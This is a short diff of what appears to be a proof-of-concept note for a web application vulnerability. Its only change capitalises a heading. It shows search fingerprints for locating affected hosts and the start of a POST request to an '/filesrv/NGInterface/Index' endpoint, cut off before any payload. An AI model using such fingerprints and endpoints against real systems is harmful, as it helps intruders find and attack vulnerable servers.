@@ -5,7 +5,7 @@
 body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
 ```
 
-## poc
+## POC
 ```javascript
 POST /filesrv/NGInterface/Index HTTP/1.1
 Host:
